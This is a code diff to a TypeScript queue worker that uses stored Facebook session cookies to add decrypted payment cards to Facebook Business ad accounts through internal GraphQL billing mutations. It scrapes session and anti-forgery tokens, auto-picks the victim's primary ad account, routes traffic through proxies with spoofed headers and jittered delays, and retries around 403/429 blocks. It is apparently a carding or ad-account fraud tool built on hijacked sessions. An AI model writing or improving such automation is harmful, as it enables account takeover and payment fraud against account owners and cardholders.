@@ -42,6 +42,20 @@ interface JobData {
     password?: string;
     country?: string;
   };
+  preferences?: {
+    acceptLanguage?: string;
+    userAgent?: string;
+    businessId?: string;
+    origin?: string;
+    referer?: string;
+    xFbUplSessionId?: string;
+    xBhFlowSessionId?: string;
+    platformTrustToken?: string;
+    e2eeNumber?: string;
+    e2eeCsc?: string;
+    adAccountId?: string;
+    usePrimaryAdAccount?: boolean;
+  };
 }
 
 const FB_BILLING_URL = 'https://business.facebook.com/billing/payment_methods';
@@ -61,60 +75,193 @@ interface SessionTokens {
   fbDtsg: string;
   lsd?: string;
   jazoest: string;
+  spin?: { r?: string; t?: string; b?: string };
+  businessId?: string;
+  xFbUplSessionId?: string;
+  xBhFlowSessionId?: string;
+  platformTrustToken?: string;
+}
+
+function sleep(ms: number) {
+  return new Promise(res => setTimeout(res, ms));
+}
+
+function randInt(min: number, max: number) {
+  return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
 function computeJazoest(fbDtsg: string): string {
-  // jazoest = '2' + sum of char codes of fb_dtsg
   let sum = 0;
   for (let i = 0; i < fbDtsg.length; i++) sum += fbDtsg.charCodeAt(i);
   return `2${sum}`;
 }
 
-async function fetchTokensFromUrl(url: string, cookie: FacebookCookieData, agent?: any): Promise<Partial<SessionTokens>> {
+function parseSpin(html: string): { r?: string; t?: string; b?: string } | undefined {
+  try {
+    const rMatch = html.match(/"__spin_r"\s*:\s*(\d+)/);
+    const tMatch = html.match(/"__spin_t"\s*:\s*(\d+)/);
+    const bMatch = html.match(/"__spin_b"\s*:\s*"([^"]+)"/);
+    return { r: rMatch?.[1], t: tMatch?.[1], b: bMatch?.[1] };
+  } catch {
+    return undefined;
+  }
+}
+
+function parseBusinessId(html: string): string | undefined {
+  const patterns = [
+    /\"selected_business_id\"\s*:\s*\"(\d+)\"/,
+    /business_id=\"(\d+)\"/,
+    /\"business_id\"\s*:\s*\"(\d+)\"/
+  ];
+  for (const p of patterns) {
+    const m = html.match(p);
+    if (m?.[1]) return m[1];
+  }
+  return undefined;
+}
+
+function parseUplAndFlow(html: string): { upl?: string; flow?: string } {
+  const res: { upl?: string; flow?: string } = {};
+  try {
+    const uplMatches = [
+      /x-fb-upl-sessionid\"?\s*[:=]\s*\"([^\"]+)\"/i,
+      /upl[_-]?sessionid\"?\s*[:=]\s*\"([^\"]+)\"/i,
+      /\"uplSessionId\"\s*:\s*\"([^\"]+)\"/i,
+    ];
+    for (const r of uplMatches) {
+      const m = html.match(r);
+      if (m?.[1]) { res.upl = m[1]; break; }
+    }
+    const flowMatches = [
+      /x-bh-flowsessionid\"?\s*[:=]\s*\"([^\"]+)\"/i,
+      /flow[_-]?sessionid\"?\s*[:=]\s*\"([^\"]+)\"/i,
+      /\"flowSessionId\"\s*:\s*\"([^\"]+)\"/i,
+    ];
+    for (const r of flowMatches) {
+      const m = html.match(r);
+      if (m?.[1]) { res.flow = m[1]; break; }
+    }
+  } catch {}
+  return res;
+}
+
+function parsePlatformTrustToken(html: string): string | undefined {
+  try {
+    const patterns = [
+      /platform_trust_token\"?\s*[:=]\s*\"([^\"]+)\"/i,
+      /\"platformTrustToken\"\s*:\s*\"([^\"]+)\"/i,
+    ];
+    for (const r of patterns) {
+      const m = html.match(r);
+      if (m?.[1]) return m[1];
+    }
+  } catch {}
+  return undefined;
+}
+
+function parsePrimaryAdAccountId(html: string): string | undefined {
+  try {
+    const patterns = [
+      /act_(\d{6,})/i,
+      /ad[_-]?account[_-]?id\"?\s*[:=]\s*\"(\d{6,})\"/i,
+      /\"accountID\"\s*:\s*\"(\d{6,})\"/i,
+      /\"adAccountID\"\s*:\s*\"(\d{6,})\"/i,
+      /\"id\"\s*:\s*\"act_(\d{6,})\"/i,
+      /selected_account_id\"\s*:\s*\"(\d{6,})\"/i,
+    ];
+    for (const r of patterns) {
+      const m = html.match(r);
+      if (m?.[1]) return m[1];
+    }
+  } catch {}
+  return undefined;
+}
+
+async function fetchPrimaryAdAccountId(cookie: FacebookCookieData, agent: any, acceptLanguage?: string, userAgent?: string): Promise<string | undefined> {
+  const urls = [
+    'https://business.facebook.com/adsmanager/manage/billing_settings',
+    'https://business.facebook.com/adsmanager',
+    'https://business.facebook.com/adsmanager/manage/',
+    'https://business.facebook.com/adsmanager/manage/campaigns',
+    'https://business.facebook.com/ads/manager/account_settings/',
+  ];
+  for (const url of urls) {
+    const headers = {
+      'User-Agent': userAgent || env.FB_USER_AGENT,
+      'Accept-Language': acceptLanguage || env.FB_ACCEPT_LANGUAGE,
+      'Cookie': buildCookieHeader(cookie),
+    } as Record<string, string>;
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 9000);
+    try {
+      const resp = await axios.get(url, {
+        headers,
+        httpsAgent: agent,
+        httpAgent: agent,
+        signal: controller.signal as any,
+        timeout: 12000,
+        maxRedirects: 0,
+        validateStatus: (s) => s >= 200 && s < 400,
+      });
+      const html = typeof resp.data === 'string' ? resp.data : '';
+      const id = parsePrimaryAdAccountId(html);
+      if (id) return id;
+    } catch {
+      // continue to next url
+    } finally {
+      clearTimeout(timeoutId);
+    }
+  }
+  return undefined;
+}
+
+async function fetchTokensFromUrl(url: string, cookie: FacebookCookieData, agent: any, acceptLanguage?: string, userAgent?: string): Promise<Partial<SessionTokens>> {
   const headers = {
-    'User-Agent': env.FB_USER_AGENT,
-    'Accept-Language': env.FB_ACCEPT_LANGUAGE,
+    'User-Agent': userAgent || env.FB_USER_AGENT,
+    'Accept-Language': acceptLanguage || env.FB_ACCEPT_LANGUAGE,
     'Cookie': buildCookieHeader(cookie),
-  };
+  } as Record<string, string>;
   const controller = new AbortController();
-  const timeoutId = setTimeout(() => controller.abort(), 7000);
+  const timeoutId = setTimeout(() => controller.abort(), 9000);
   try {
     const resp = await axios.get(url, {
       headers,
       httpsAgent: agent,
       httpAgent: agent,
       signal: controller.signal as any,
-      timeout: 9000,
+      timeout: 12000,
       maxRedirects: 0,
       validateStatus: (s) => s >= 200 && s < 400,
     });
     const html = typeof resp.data === 'string' ? resp.data : '';
     const out: Partial<SessionTokens> = {};
-    // fb_dtsg variants
-    let match = html.match(/name="fb_dtsg"\s+value="([^"]+)"/);
+    let match = html.match(/name=\"fb_dtsg\"\s+value=\"([^\"]+)\"/);
     if (match) out.fbDtsg = match[1];
     if (!out.fbDtsg) {
-      match = html.match(/__DTSGInitialData__\s*=\s*"([^"]+)"/);
+      match = html.match(/__DTSGInitialData__\s*=\s*\"([^\"]+)\"/);
       if (match) out.fbDtsg = match[1];
     }
-    // lsd token variants
-    match = html.match(/name="lsd"\s+value="([^"]+)"/);
+    match = html.match(/name=\"lsd\"\s+value=\"([^\"]+)\"/);
     if (match) out.lsd = match[1];
     if (!out.lsd) {
-      match = html.match(/LSD\s*=\s*\{[^}]*?token\s*:\s*"([^"]+)"/);
+      match = html.match(/LSD\s*=\s*\{[^}]*?token\s*:\s*\"([^\"]+)\"/);
       if (match) out.lsd = match[1];
     }
-    if (out.fbDtsg) {
-      out.jazoest = computeJazoest(out.fbDtsg);
-    }
+    out.spin = parseSpin(html);
+    out.businessId = parseBusinessId(html);
+    const { upl, flow } = parseUplAndFlow(html);
+    if (upl) out.xFbUplSessionId = upl;
+    if (flow) out.xBhFlowSessionId = flow;
+    const pt = parsePlatformTrustToken(html);
+    if (pt) out.platformTrustToken = pt;
+    if (out.fbDtsg) out.jazoest = computeJazoest(out.fbDtsg);
     return out;
   } finally {
     clearTimeout(timeoutId);
   }
 }
 
-async function fetchSessionTokens(cookie: FacebookCookieData, agent?: any): Promise<SessionTokens | null> {
-  // Try multiple known pages that usually expose tokens
+async function fetchSessionTokens(cookie: FacebookCookieData, agent: any, acceptLanguage?: string, userAgent?: string): Promise<SessionTokens | null> {
   const candidateUrls = [
     FB_BILLING_URL,
     'https://business.facebook.com/business_locations',
@@ -122,40 +269,63 @@ async function fetchSessionTokens(cookie: FacebookCookieData, agent?: any): Prom
     'https://business.facebook.com/ads/manager/billing/transactions/'
   ];
   for (const url of candidateUrls) {
-    const tokens = await fetchTokensFromUrl(url, cookie, agent);
+    const tokens = await fetchTokensFromUrl(url, cookie, agent, acceptLanguage, userAgent);
     if (tokens.fbDtsg) {
       return {
         fbDtsg: tokens.fbDtsg!,
         lsd: tokens.lsd,
         jazoest: tokens.jazoest || computeJazoest(tokens.fbDtsg!),
+        spin: tokens.spin,
+        businessId: tokens.businessId,
       };
     }
   }
   return null;
 }
 
-function buildGraphQLPayload(cookie: FacebookCookieData, card: FacebookCardData, tokens: SessionTokens) {
-  const docId = env.FB_DOC_ID || 'useBillingAddPaymentMethodMutation';
-  const variables = {
+function buildBillingSaveCardCredentialVariables(card: FacebookCardData, tokens: SessionTokens, prefs?: JobData['preferences']) {
+  const number = (card.number || '').replace(/\s+/g, '');
+  const bin = number.slice(0, 6);
+  const last4 = number.slice(-4);
+  const expiry_month = parseInt(card.exp_month);
+  const expiry_year = parseInt(card.exp_year);
+  const e2eeNumber = (prefs as any)?.e2eeNumber || '$e2ee';
+  const e2eeCsc = (prefs as any)?.e2eeCsc || '$e2ee';
+  const chosenPaymentAccountId = (prefs?.adAccountId && prefs.adAccountId.trim()) || prefs?.businessId || tokens.businessId;
+  const chosenActorId = chosenPaymentAccountId || prefs?.businessId || tokens.businessId;
+  return {
     input: {
-      payment_method_type: 'CREDIT_CARD',
-      credit_card: {
-        card_number: card.number.replace(/\s/g, ''),
-        expiry_month: parseInt(card.exp_month),
-        expiry_year: parseInt(card.exp_year),
-        security_code: card.cvv,
-        cardholder_name: card.cardholder_name || 'Card Holder',
-        billing_address: {
-          country_code: card.country || 'US',
-          postal_code: card.postal_code || '12345',
-          city: card.city || 'City',
-          street_address: card.street_address || 'Street Address'
-        }
+      billing_address: {
+        country_code: card.country || 'US',
       },
-      is_default: false,
-      client_mutation_id: Date.now().toString()
+      card_data: {
+        bin,
+        last_4: last4,
+        expiry_month,
+        expiry_year,
+        cardholder_name: card.cardholder_name || 'Card Holder',
+        credit_card_number: { sensitive_string_value: e2eeNumber },
+        csc: { sensitive_string_value: e2eeCsc },
+      },
+      client_info: {
+        locale: (prefs?.acceptLanguage || env.FB_ACCEPT_LANGUAGE || 'en-US').split(',')[0],
+        timezone: card.timezone || 'UTC',
+        user_agent: prefs?.userAgent || env.FB_USER_AGENT,
+      },
+      payment_account_id: chosenPaymentAccountId,
+      payment_intent: 'ADD_PM',
+      platform_trust_token: prefs?.platformTrustToken || tokens.platformTrustToken || undefined,
+      upl_logging_data: {
+        flow_name: 'BillingSaveCardCredentialStateMutation',
+      },
+      actor_id: chosenActorId,
+      set_default: false,
     }
   };
+}
+
+function buildGraphQLFormData(cookie: FacebookCookieData, variables: any, tokens: SessionTokens) {
+  const docId = '24198400473121149';
   const requestData: Record<string, any> = {
     av: cookie.c_user,
     __user: cookie.c_user,
@@ -164,41 +334,97 @@ function buildGraphQLPayload(cookie: FacebookCookieData, card: FacebookCardData,
     fb_dtsg: tokens.fbDtsg,
     jazoest: tokens.jazoest,
     fb_api_caller_class: 'RelayModern',
-    fb_api_req_friendly_name: 'useBillingAddPaymentMethodMutation',
+    fb_api_req_friendly_name: 'BillingSaveCardCredentialStateMutation',
     variables: JSON.stringify(variables),
     server_timestamps: true,
     doc_id: docId,
   };
   if (tokens.lsd) requestData.lsd = tokens.lsd;
+  if (tokens.spin?.r) requestData.__spin_r = tokens.spin.r;
+  if (tokens.spin?.t) requestData.__spin_t = tokens.spin.t;
+  if (tokens.spin?.b) requestData.__spin_b = tokens.spin.b;
   const formData = Object.entries(requestData)
     .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(String(value))}`)
     .join('&');
   return formData;
 }
 
-async function prepareSession(cookie: FacebookCookieData, agent?: any): Promise<SessionTokens> {
-  // retry up to 3 times for tokens
-  for (let attempt = 0; attempt < 3; attempt++) {
-    const tokens = await fetchSessionTokens(cookie, agent);
-    if (tokens) return tokens;
-  }
-  throw new Error('Failed to get fb_dtsg token');
-}
-
-async function sendRequest(cookie: FacebookCookieData, formData: string, tokens: SessionTokens, agent?: any) {
+async function getServerEncryptionKey(cookie: FacebookCookieData, tokens: SessionTokens, agent: any, acceptLanguage?: string, userAgent?: string) {
+  const docId = '23994203586844376';
+  const variables = { input: {} };
+  const requestData: Record<string, any> = {
+    av: cookie.c_user,
+    __user: cookie.c_user,
+    __a: 1,
+    dpr: 1,
+    fb_dtsg: tokens.fbDtsg,
+    jazoest: tokens.jazoest,
+    fb_api_caller_class: 'RelayModern',
+    fb_api_req_friendly_name: 'PaymentsCometGetServerEncryptionKeyMutation',
+    variables: JSON.stringify(variables),
+    server_timestamps: true,
+    doc_id: docId,
+  };
+  if (tokens.lsd) requestData.lsd = tokens.lsd;
+  if (tokens.spin?.r) requestData.__spin_r = tokens.spin.r;
+  if (tokens.spin?.t) requestData.__spin_t = tokens.spin.t;
+  if (tokens.spin?.b) requestData.__spin_b = tokens.spin.b;
+  const formData = new URLSearchParams(requestData as any).toString();
   const headers: Record<string, string> = {
     'Content-Type': 'application/x-www-form-urlencoded',
-    'User-Agent': env.FB_USER_AGENT,
-    'Accept-Language': env.FB_ACCEPT_LANGUAGE,
+    'User-Agent': userAgent || env.FB_USER_AGENT,
+    'Accept-Language': acceptLanguage || env.FB_ACCEPT_LANGUAGE,
+    'Accept': '*/*',
     'Cookie': buildCookieHeader(cookie),
     'Connection': 'keep-alive',
     'Origin': FB_ORIGIN,
     'Referer': FB_BILLING_URL,
-    'x-fb-friendly-name': 'useBillingAddPaymentMethodMutation',
+    'x-fb-friendly-name': 'PaymentsCometGetServerEncryptionKeyMutation',
+    'x-asbd-id': env.ASBD_ID || '129477',
   };
   if (tokens.lsd) headers['x-fb-lsd'] = tokens.lsd;
+  const response = await axios.post(FB_GRAPHQL_URL, formData, {
+    headers,
+    httpsAgent: agent,
+    httpAgent: agent,
+    timeout: 20000,
+    maxRedirects: 0,
+    validateStatus: (s) => s >= 200 && s < 500,
+  });
+  const text = typeof response.data === 'string' ? response.data.replace(/^for \(;;\);/, '') : JSON.stringify(response.data);
+  try {
+    const parsed = JSON.parse(text);
+    return parsed?.data?.payments_get_server_encryption_key || parsed?.data || parsed;
+  } catch {
+    return null;
+  }
+}
+
+function requiredHeaders(tokens: SessionTokens, prefs?: JobData['preferences']) {
+  const headers: Record<string, string> = {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'User-Agent': (prefs?.userAgent || env.FB_USER_AGENT),
+    'Accept-Language': (prefs?.acceptLanguage || env.FB_ACCEPT_LANGUAGE),
+    'Accept': '*/*',
+    'Connection': 'keep-alive',
+    'Origin': prefs?.origin || FB_ORIGIN,
+    'Referer': prefs?.referer || FB_BILLING_URL,
+    'x-fb-friendly-name': 'BillingSaveCardCredentialStateMutation',
+    'x-asbd-id': env.ASBD_ID || '129477',
+  };
+  if (tokens.lsd) headers['x-fb-lsd'] = tokens.lsd;
+  if (prefs?.xFbUplSessionId || tokens.xFbUplSessionId) headers['x-fb-upl-sessionid'] = (prefs?.xFbUplSessionId || tokens.xFbUplSessionId)!;
+  if (prefs?.xBhFlowSessionId || tokens.xBhFlowSessionId) headers['x-bh-flowsessionid'] = (prefs?.xBhFlowSessionId || tokens.xBhFlowSessionId)!;
+  return headers;
+}
+
+async function sendRequest(cookie: FacebookCookieData, formData: string, tokens: SessionTokens, agent: any, acceptLanguage?: string, userAgent?: string, headersExtra?: Record<string,string>) {
+  const baseHeaders: Record<string, string> = {
+    'Cookie': buildCookieHeader(cookie),
+  };
+  const headers = { ...requiredHeaders(tokens, { acceptLanguage, userAgent }), ...baseHeaders, ...(headersExtra || {}) };
   const controller = new AbortController();
-  const timeoutId = setTimeout(() => controller.abort(), 30000); // 30s phase timeout
+  const timeoutId = setTimeout(() => controller.abort(), 30000);
   try {
     const fallbackHttp = new http.Agent({ keepAlive: true, maxSockets: 50 });
     const fallbackHttps = new https.Agent({ keepAlive: true, maxSockets: 50 });
@@ -229,12 +455,51 @@ function parseResult(data: any) {
     }
     return parsed;
   } catch (e) {
-    // If not JSON, still accept as success fallback
     return { raw: text };
   }
 }
 
-async function processJob(data: JobData, job?: Job) {
+function isConfirmedSuccess(parsed: any): boolean {
+  if (!parsed || typeof parsed !== 'object') return false;
+  if (parsed.data && Object.keys(parsed.data).length > 0) return true;
+  if (parsed.success === true) return true;
+  return false;
+}
+
+async function performFollowUpChecks(cookie: FacebookCookieData, tokens: SessionTokens, agent: any, acceptLanguage?: string, userAgent?: string) {
+  const queries = [
+    { friendly: 'BillingRiskCredentialAuthScreenQuery', doc_id: '31537842232469763' },
+    { friendly: 'BillingSDCVerifyScreenQuery', doc_id: '9370121456450229' },
+  ];
+  for (const q of queries) {
+    const requestData: Record<string, any> = {
+      av: cookie.c_user,
+      __user: cookie.c_user,
+      __a: 1,
+      dpr: 1,
+      fb_dtsg: tokens.fbDtsg,
+      jazoest: tokens.jazoest,
+      fb_api_caller_class: 'RelayModern',
+      fb_api_req_friendly_name: q.friendly,
+      variables: JSON.stringify({}),
+      server_timestamps: true,
+      doc_id: q.doc_id,
+    };
+    if (tokens.lsd) requestData.lsd = tokens.lsd;
+    if (tokens.spin?.r) requestData.__spin_r = tokens.spin.r;
+    if (tokens.spin?.t) requestData.__spin_t = tokens.spin.t;
+    if (tokens.spin?.b) requestData.__spin_b = tokens.spin.b;
+    const formData = new URLSearchParams(requestData as any).toString();
+    const resp = await sendRequest(cookie, formData, tokens, agent, acceptLanguage, userAgent, {
+      'x-fb-friendly-name': q.friendly,
+    });
+    const parsed = parseResult(resp.data);
+    // We only need to log; caller decides success policy
+    // ... existing code ...
+  }
+}
+
+export async function processJob(data: JobData, job?: Job) {
   const db = await getDb();
   const jobId = job?.id ? String(job.id) : undefined;
   const results = db.collection<any>('job_results');
@@ -265,29 +530,94 @@ async function processJob(data: JobData, job?: Job) {
   const card = decryptJson<FacebookCardData>(cardDoc.payload);
   const agent = buildAgent(data.proxyConfig);
 
+  const acceptLanguage = data.preferences?.acceptLanguage || env.FB_ACCEPT_LANGUAGE;
+  const userAgent = data.preferences?.userAgent || env.FB_USER_AGENT;
+
   await logStep('prepare_session', 'started', 'Fetching fb_dtsg');
 
   try {
-    const tokens = await prepareSession(cookie, agent);
+    const tokens = await (async () => {
+      for (let attempt = 0; attempt < 3; attempt++) {
+        const t = await fetchSessionTokens(cookie, agent, acceptLanguage, userAgent);
+        if (t) return t;
+        await sleep(200 + randInt(50, 150));
+      }
+      throw new Error('Failed to get fb_dtsg token');
+    })();
     await logStep('prepare_session', 'success', `fb_dtsg fetched`);
+
+    // Resolve ad account id if requested to use primary
+    let resolvedPrefs = { ...(data.preferences || {}) };
+    if (resolvedPrefs.usePrimaryAdAccount && !resolvedPrefs.adAccountId) {
+      await logStep('resolve_ad_account', 'started', 'Fetching primary ad account id');
+      const adId = await fetchPrimaryAdAccountId(cookie, agent, acceptLanguage, userAgent);
+      if (adId) {
+        resolvedPrefs.adAccountId = adId;
+        await logStep('resolve_ad_account', 'success', `adAccountId=${adId}`);
+      } else {
+        await logStep('resolve_ad_account', 'failed', 'Could not detect primary ad account id');
+      }
+    }
+
+    await logStep('encryption_key', 'started');
+    const encKey = await getServerEncryptionKey(cookie, tokens, agent, acceptLanguage, userAgent);
+    await logStep('encryption_key', encKey ? 'success' : 'failed');
+
+    const variables = buildBillingSaveCardCredentialVariables(card, tokens, resolvedPrefs);
+
     await logStep('build_payload', 'started');
-    const formData = buildGraphQLPayload(cookie, card, tokens);
+    const formData = buildGraphQLFormData(cookie, variables, tokens);
     await logStep('build_payload', 'success');
+
+    await sleep(randInt(120, 400));
+
     await logStep('send_request', 'started');
 
-    // Try up to 2 attempts of sending the GraphQL request if response isn't clearly successful
-    let response = await sendRequest(cookie, formData, tokens, agent);
-    await logStep('send_request', 'success', `HTTP ${response.status}`);
-    let result = parseResult(response.data);
+    let attempt = 0;
+    let response: any;
+    let parsed: any;
+    let lastError: any = null;
+    let pendingVerification = false;
 
-    // Optional heuristic: if response lacks data and status < 400, retry once with fresh tokens
-    if (response.status < 400 && typeof result === 'object' && !('data' in result)) {
+    while (attempt < 3) {
+      attempt++;
+      response = await sendRequest(cookie, formData, tokens, agent, acceptLanguage, userAgent);
+      await logStep('send_request', 'success', `HTTP ${response.status}`);
+      parsed = parseResult(response.data);
+
+      const parsedText = JSON.stringify(parsed || {});
+      if (/PENDING_VERIFICATION|PENDING/i.test(parsedText)) pendingVerification = true;
+
+      if (response.status === 429 || response.status === 403) {
+        lastError = new Error(`HTTP ${response.status}`);
+        await logStep('backoff', 'failed', `Rate/Forbidden; backoff attempt ${attempt}`);
+        await sleep(1000 * attempt + randInt(200, 800));
+        const refreshed = await fetchSessionTokens(cookie, agent, acceptLanguage, userAgent) || tokens;
+        const formData2 = buildGraphQLFormData(cookie, variables, refreshed);
+        response = await sendRequest(cookie, formData2, refreshed, agent, acceptLanguage, userAgent);
+        parsed = parseResult(response.data);
+        if (/PENDING_VERIFICATION|PENDING/i.test(JSON.stringify(parsed || {}))) pendingVerification = true;
+        if (isConfirmedSuccess(parsed) && response.status < 400) break;
+        continue;
+      }
+
+      if (response.status >= 400) {
+        lastError = new Error(`HTTP ${response.status}`);
+        break;
+      }
+
+      if (isConfirmedSuccess(parsed)) break;
+
       await logStep('retry', 'started', 'Retrying with fresh tokens');
-      const refreshed = await prepareSession(cookie, agent);
-      const formData2 = buildGraphQLPayload(cookie, card, refreshed);
-      response = await sendRequest(cookie, formData2, refreshed, agent);
-      await logStep('retry', 'success', `HTTP ${response.status}`);
-      result = parseResult(response.data);
+      const refreshed = await fetchSessionTokens(cookie, agent, acceptLanguage, userAgent) || tokens;
+      const formData2 = buildGraphQLFormData(cookie, variables, refreshed);
+      response = await sendRequest(cookie, formData2, refreshed, agent, acceptLanguage, userAgent);
+      parsed = parseResult(response.data);
+      if (/PENDING_VERIFICATION|PENDING/i.test(JSON.stringify(parsed || {}))) pendingVerification = true;
+
+      if (isConfirmedSuccess(parsed)) break;
+
+      await sleep(300 + randInt(100, 400));
     }
 
     await results.updateOne(
@@ -298,20 +628,27 @@ async function processJob(data: JobData, job?: Job) {
             cookieId: cookieDoc._id,
             cardId: cardDoc._id,
             serverId: data.serverId || null,
-            success: response.status >= 200 && response.status < 400,
-            reason: 'Card add attempt finished',
+            success: (response?.status >= 200 && response?.status < 400 && isConfirmedSuccess(parsed)) || pendingVerification,
+            reason: pendingVerification ? 'Pending verification' : (isConfirmedSuccess(parsed) ? 'Card add attempt finished' : (lastError?.message || 'Not confirmed')),
             country: card.country || cookie.country || null,
-            response: result,
+            response: parsed,
+            pendingVerification,
             finishedAt: new Date(),
           },
-          $push: { steps: { phase: 'done', status: 'success', message: null, at: new Date() } },
+          $push: { steps: { phase: 'done', status: ((response?.status >= 200 && response?.status < 400 && isConfirmedSuccess(parsed)) || pendingVerification) ? 'success' : 'failed', message: null, at: new Date() } },
         } as any
       ),
       { upsert: true }
     );
 
-    if (response.status >= 400) throw new Error(`HTTP ${response.status}`);
-    return { success: true, result };
+    if (!((response?.status >= 200 && response?.status < 400 && isConfirmedSuccess(parsed)) || pendingVerification)) {
+      throw new Error('Add card not confirmed by GraphQL response');
+    }
+
+    // Follow-up checks
+    await performFollowUpChecks(cookie, tokens, agent, acceptLanguage, userAgent);
+
+    return { success: true, result: parsed, pendingVerification };
   } catch (error) {
     await logStep('error', 'failed', error instanceof Error ? error.message : String(error));
     await results.updateOne(
@@ -336,4 +673,4 @@ async function processJob(data: JobData, job?: Job) {
   }
 }
 
-export const worker = makeAddCardWorker(processJob); 
+export const worker = makeAddCardWorker(processJob as any); 
